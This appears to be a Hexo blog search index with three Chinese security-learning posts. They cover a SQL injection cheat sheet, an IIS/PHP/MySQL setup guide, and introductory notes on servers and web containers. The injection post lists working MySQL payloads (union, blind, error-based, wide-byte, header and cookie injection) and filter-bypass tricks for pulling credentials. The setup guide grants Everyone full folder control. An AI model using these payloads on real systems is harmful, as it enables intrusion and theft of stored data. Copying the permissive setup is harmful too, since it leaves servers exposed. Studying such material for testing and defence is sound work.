<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入总结</title>
      <link href="2020/09/17/sql-zhu-ru-zong-jie/"/>
      <url>2020/09/17/sql-zhu-ru-zong-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a>0x01 什么是SQL注入</h3><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><h3 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h3><h6 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a><strong>按变量类型分</strong></h6><p>&emsp;<em>数字型</em><br>&emsp;<em>字符型</em></p><h6 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a><strong>按HTTP提交方式分</strong></h6><p>&emsp;<em>GET注入</em><br>&emsp;<em>POST注入</em><br>&emsp;<em>Cookie注入</em></p><h6 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a><strong>按注入方式分</strong></h6><p>&emsp;<em>报错注入</em><br>&emsp;<em>盲注</em><br>&emsp;&emsp;&emsp;<em>布尔盲注</em><br>&emsp;&emsp;&emsp;<em>时间盲注</em><br>&emsp;<em>union注入</em><br>&emsp;<em>编码问题</em><br>&emsp;&emsp;&emsp;<em>宽字节注入</em></p><h3 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h3><h6 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h6><p>&emsp;sql server：Windows&#40;IIS&#41;</p><p>&emsp;MySQL：Apache</p><h6 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h6><p>&emsp;Microsoft SQL Server：ASP和.Net</p><p>&emsp;MySQL：PHP</p><p>&emsp;Oracle/MySQL：java</p><h3 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h3><ul><li>&#40;以下是对mysql数据库的总结，其他类型数据库会不定时更新&#41;</li><li>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。</li></ul><p><strong><em>information_schema</em></strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong><em>SCHEMATA</em></strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong><em>TABLES</em></strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong><em>COLUMNS</em></strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h3 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h3><ul><li>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</li></ul><p><strong>1.MySQL &gt;= 5.0</strong><br>1.获取字段数<br>&emsp;&emsp;order by n &#40;通过不断尝试改变n的值来观察页面反应确定字段数&#41;<br>2.获取系统数据库名<br>&emsp;&emsp;在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中<br>&emsp;&emsp;select null,null,schema_name from information_schema.schemata<br>3.获取当前数据库名<br>&emsp;&emsp;select null,null,…,database&#40;&#41;<br>4.获取数据库中的表<br>&emsp;&emsp;select null,null,…,group_concat&#40;table_name&#41; from information_schema.tables where table_schema=database&#40;&#41;<br>&emsp;&emsp;或select null,null,…,table_name from information_schema.tables where table_schema=database&#40;&#41; limit 0,1<br>5.获取表中的字段<br>&emsp;&emsp;这里假设已经获取到表名为user<br>&emsp;&emsp;select null,null,…,group_concat&#40;column_name&#41; from information_schema.columns where table_schema=database&#40;&#41; and table_name=’users’<br>6.获取各个字段值<br>&emsp;&emsp;这里假设已经获取到表名为user，且字段为username和password<br>&emsp;&emsp;select null,group_concat&#40;username,password&#41; from users<br><strong>2.MySQL &lt; 5.0</strong><br>&emsp;&emsp;MySQL &lt; 5.0 没有信息数据库information_schema，所以只能手工枚举爆破&#40;二分法思想&#41;。&#40;该方式通常用于盲注。&#41;<br>&emsp;&emsp;<em>相关函数</em><br>&emsp;&emsp;&emsp;&emsp;length&#40;str&#41; ：返回字符串str的长度<br>&emsp;&emsp;&emsp;&emsp;substr&#40;str, pos, len&#41; ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始<br>&emsp;&emsp;&emsp;&emsp;mid&#40;str,pos,len&#41; ：跟上面的一样，截取字符串</p><p>&emsp;&emsp;&emsp;&emsp;ascii&#40;str&#41; ：返回字符串str的最左面字符的ASCII代码值</p><p>&emsp;&emsp;&emsp;&emsp;ord&#40;str&#41; ：将字符或布尔类型转成ascll码</p><p>&emsp;&emsp;&emsp;&emsp;if&#40;a,b,c&#41; ：a为条件，a为true，返回b，否则返回c，如if&#40;1&gt;2,1,0&#41;,返回0</p><p>1.基于布尔的盲注<br>and ascii&#40;substr&#40;&#40;select database&#40;&#41;&#41;,1,1&#41;&#41;&gt;64 /<em>判断数据库名的第一个字符的ascii值是否大于64</em>/<br>2.基于时间的盲注<br>id=1 union select if&#40;SUBSTRING&#40;user&#40;&#41;,1,4&#41;=’root’,sleep&#40;4&#41;,1&#41;,null,null /<em>提取用户名前四个字符做判断，正确就延迟4秒，错误返回1</em>/</p><h3 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h3><ul><li>注释符：<br>#<br>&#45;&#45;&#40;空格&#41;&ensp;或&#45;&#45;+<br>/**/</li><li>内联注释：<br>/<em>！…</em>/</li><li>union注入<br>id =-1 union select 1,2,3   /<em>获取字段</em>/</li><li>Boolean注入<br>id=1’ substr&#40;database&#40;&#41;,1,1&#41;=’t’–+     /<em>判断数据名长度</em>/</li><li>报错注入<br>1 floor&#40;&#41;和rand&#40;&#41;<br>union select count&#40;<em>&#41;,2,concat&#40;’:’,&#40;select database&#40;&#41;&#41;,’:’,floor&#40;rand&#40;&#41;</em>2&#41;&#41;as a from information_schema.tables group by a       /<em>利用错误信息得到当前数据库名</em>/<br>2 extractvalue&#40;&#41;<br>id=1 and &#40;extractvalue&#40;1,concat&#40;0x7e,&#40;select user&#40;&#41;&#41;,0x7e&#41;&#41;&#41;<br>3 updatexml&#40;&#41;<br>id=1 and &#40;updatexml&#40;1,concat&#40;0x7e,&#40;select user&#40;&#41;&#41;,0x7e&#41;,1&#41;&#41;<br>4 geometrycollection&#40;&#41;<br>id=1 and geometrycollection&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>5 multipoint&#40;&#41;<br>id=1 and multipoint&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>6 polygon&#40;&#41;<br>id=1 and polygon&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>7 multipolygon&#40;&#41;<br>id=1 and multipolygon&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>8 linestring&#40;&#41;<br>id=1 and linestring&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>9 multilinestring&#40;&#41;<br>id=1 and multilinestring&#40;&#40;select <em> from&#40;select </em> from&#40;select user&#40;&#41;&#41;a&#41;b&#41;&#41;<br>10 exp&#40;&#41;<br>id=1 and exp&#40;~&#40;select * from&#40;select user&#40;&#41;&#41;a&#41;&#41;<br>时间注入<br>id = 1 and if&#40;length&#40;database&#40;&#41;&#41;&gt;1,sleep&#40;5&#41;,1&#41;<br>堆叠查询注入<br>id = 1’;select if&#40;sub&#40;user&#40;&#41;,1,1&#41;=’r’,sleep&#40;3&#41;,1&#41;%23<br>二次注入<br>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test’，接下来访问xxx.php?username=test’，页面返回id=22；</li></ul><p>接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p><p>访问xxx.php?id=test’ union select 1,user&#40;&#41;,3%23，获得新的id=40，得到user&#40;&#41;的结果，利用这种注入方式会得到数据库中的值。</p><p>宽字节注入<br>利用条件：<br>[ ] 查询参数是被单引号包围的，传入的单引号又被转义符&#40;&#41;转义，如在后台数据库中对接受的参数使用addslashes&#40;&#41;或其过滤函数<br>[ ] 数据库的编码为GBK<br>利用方式<br>id = -1%DF’ union select 1,user&#40;&#41;,3,%23<br>在上述条件下，单引号’被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p><p>Cookie注入<br>当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。</p><p>Cookie: id = 1 and 1=1<br>base64注入<br>对参数进行base64编码，再发送请求。</p><p>说明：id=1’，1的base64编码为MSc=，而=的url编码为%3d，所以得到以下结果：</p><p>id=MSc%3d<br>XFF注入<br>XFF&#40;X-Forward-For&#41;，简称XFF头，它代表客户端真实的ip地址</p><p>X-Forward-For：127.0.0.1’ select 1,2,user&#40;&#41;<br>0x07 SQL注入绕过技术<br>大小写绕过</p><p>双写绕过</p><p>编码绕过&#40;url全编码、十六进制&#41;</p><p>内联注释绕过</p><p>关键字替换</p><p>逗号绕过</p><p>substr、mid&#40;&#41;函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p><p>比较符号&#40; &gt;、&lt; &#41;绕过&#40;greatest、between and&#41;</p><p>逻辑符号的替换&#40;and=&amp;&amp; or=|| xor=| not=!&#41;</p><p>空格绕过&#40;用括号，+等绕过&#41;</p><p>等价函数绕过</p><p>hex&#40;&#41;、bin&#40;&#41;=ascii&#40;&#41;<br>concat_ws&#40;&#41;=group_concat&#40;&#41;<br>mid&#40;&#41;、substr&#40;&#41;=substring&#40;&#41;<br>http参数污染&#40;id=1 union select+1,2,3+from+users+where+id=1–变为id=1 union select+1&amp;id=2,3+from+users+where+id=1–&#41;</p><p>缓冲区溢出绕过 &#40;id=1 and &#40;select 1&#41;=&#40;Select&nbsp;0xAAAAAAAAAAAAAAAAAAAAA&#41;+UnIoN+SeLeCT+1,2,version&#40;&#41;,4,5,database&#40;&#41;,user&#40;&#41;,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用&#41;</p>]]></content>
      
      
      <categories>
          
          <category> SQL inject </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS+MySQL+PHP环境搭建</title>
      <link href="2020/09/15/iis-mysql-php/"/>
      <url>2020/09/15/iis-mysql-php/</url>
      
        <content type="html"><![CDATA[<h2 id="windows-server-2016下搭建IIS-PHP-MySQL"><a href="#windows-server-2016下搭建IIS-PHP-MySQL" class="headerlink" title="windows server 2016下搭建IIS+PHP+MySQL"></a>windows server 2016下搭建IIS+PHP+MySQL</h2><p>在安装IIS时在默认选项中额外勾选CGI<br><img src="./1.png" alt></p><p>下载NTS版本的PHP，注意是否有相应的VC运行库<br><img src="./2.png" alt><br>对PHP环境进行配置（修改PHP.ini）</p><p>1.解压文件，将php文件夹中的php.ini-development文件进行备份（修改文件前备份是个好习惯）<br>2.记事本打开php.ini-development文件，修改为对应时区，date.timezone =”Asia/Shanghai”，注意去掉前面的分号“;”。<br>3.激活你想要的扩展选项，即将相应dll语句前的分号“;”删除；由于是PHP+MySQL环境，推荐激活 gd2、mbstring、mysqli、pdo_mysql<br>4.保存为php.ini<br><img src="./3.png" alt></p><p>IIS配置PHP<br>打开IIS管理器，选择处理程序映射（Handler Mappings）<br><img src="./4.png" alt></p><p>选择右边的添加模块映射<br><img src="./5.png" alt></p><p>填写对应选项<br><img src="./6.png" alt></p><p>验证<br>在网站目录下添加index.php文件，在文件中写入<?php phpinfo(); ?>。</p><p>在默认文档下添加index.php<br><img src="./7.png" alt><br>访问localhost<br><img src="./8.png" alt></p><p>下载安装Windows版MySQL<br>关于此项请移步<a href="https://blog.csdn.net/u014416239/article/details/52446608" target="_blank" rel="noopener">https://blog.csdn.net/u014416239/article/details/52446608</a><br>或者<a href="www.baidu.com">百度</a>搜索 Windows下安装MySQL</p><p>基于PHP的CMS部署<br>将CMS解压（以解压到C盘根目录为例）<br><img src="./9.png" alt><br>给文件夹设置权限，方便起见，这里添加Everyone用户并赋予完全控制 权限（其实应该是给IUSR 用户赋予相关权限）<br><img src="./10.png" alt></p><p>在IIS管理器中添加网站，填入相关内容<br><img src="./11.png" alt></p><p>有闲心的话可以在默认文档中添加index.php作为默认首页<br><img src="./12.png" alt></p><p>打开127.0.0.1:[设置的端口] 访问网站,根据CMS的引导完成CMS的部署</p><p>最终结果<br><img src="./13.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安预备基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>诚殷网络 一</title>
      <link href="2020/09/14/lesson-one-of-cynetwork/"/>
      <url>2020/09/14/lesson-one-of-cynetwork/</url>
      
        <content type="html"><![CDATA[<h1 id="诚殷网络第一课"><a href="#诚殷网络第一课" class="headerlink" title="诚殷网络第一课"></a>诚殷网络第一课</h1><h3 id="PC与服务器的区别"><a href="#PC与服务器的区别" class="headerlink" title="PC与服务器的区别"></a>PC与服务器的区别</h3><p>服务器侧重于稳定性及多线程，PC侧重用户体验和通用性</p><h3 id="服务器端常见操作系统"><a href="#服务器端常见操作系统" class="headerlink" title="服务器端常见操作系统"></a>服务器端常见操作系统</h3><h5 id="Window："><a href="#Window：" class="headerlink" title="Window："></a>Window：</h5><ul><li>Windows2003</li><li>Windows2008</li><li>Windows2012</li><li>Windows2016</li><li>Windows2019<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5></li><li>CentOS</li><li>Ubuntu</li><li>RedHat</li><li>Debian</li></ul><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，ASP的IIS或PWS都是这样的容器。一个服务器可以有多个容器。</p><ul><li>IIS</li><li>Apache</li><li>Nginx</li><li>Tomcat</li><li>Weblogic<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3></li><li>Access</li><li>SQLserver（MSsql）</li><li>Mysql</li><li>Oracle</li><li>Redis</li><li>Mongodb<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3></li><li>ASP</li><li>ASPX(ASP.NET)</li><li>JSP</li><li>PHP<h3 id="常见容器、数据库、脚本语言搭配"><a href="#常见容器、数据库、脚本语言搭配" class="headerlink" title="常见容器、数据库、脚本语言搭配"></a>常见容器、数据库、脚本语言搭配</h3><table><thead><tr><th align="center">容器</th><th align="center">数据库</th><th align="center">脚本语言</th></tr></thead><tbody><tr><td align="center">IIS</td><td align="center">ACCESS/MSSQL</td><td align="center">ASP/ASPX</td></tr><tr><td align="center">Apache/Nginx</td><td align="center">MySQL</td><td align="center">PHP</td></tr><tr><td align="center">Tomcat</td><td align="center">JSP</td><td align="center">MySQL/Oracle</td></tr></tbody></table></li></ul><ul><li>注:之上关系并非固定标准,而是一种民间的默认。</li></ul><h3 id="关于web服务器、中间件、web容器的辨析"><a href="#关于web服务器、中间件、web容器的辨析" class="headerlink" title="关于web服务器、中间件、web容器的辨析"></a>关于web服务器、中间件、web容器的辨析</h3><ul><li>以下仅为个人见解</li><li>web服务器是用来为web服务提供一个寄生或者运行基础环境（容器）的主机（包括硬件和软件，可以是物理的、也可以是云的），web服务器不止可以为web提供基础环境，还可以提供其他的服务如邮件服务，DNS服务等。</li><li>中间件用于连接系统软件和应用软件，类似于进程通信间的管道或者缓冲区，或者网络中的服务访问点之类的。</li><li>web容器是web服务的语言解析环境，web服务直接在容器的环境中运行。<br><img src="./1.png" alt="web服务器、中间件、web容器关系图"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 扫盲 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安预备基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
